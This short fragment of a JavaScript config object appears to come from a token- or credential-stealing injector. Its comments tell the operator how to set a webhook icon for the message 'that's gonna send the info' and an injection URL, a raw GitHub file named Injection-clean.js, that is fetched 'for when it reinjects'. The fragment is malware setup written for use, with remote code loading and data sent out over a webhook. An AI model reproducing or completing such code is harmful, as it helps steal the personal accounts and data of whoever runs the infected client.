...
const config = {
  ...
  embed_icon: 'None', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/Yaz0x/v-tools.tk/main/Injection-clean.js', //injection url for when it reinjects
  /**
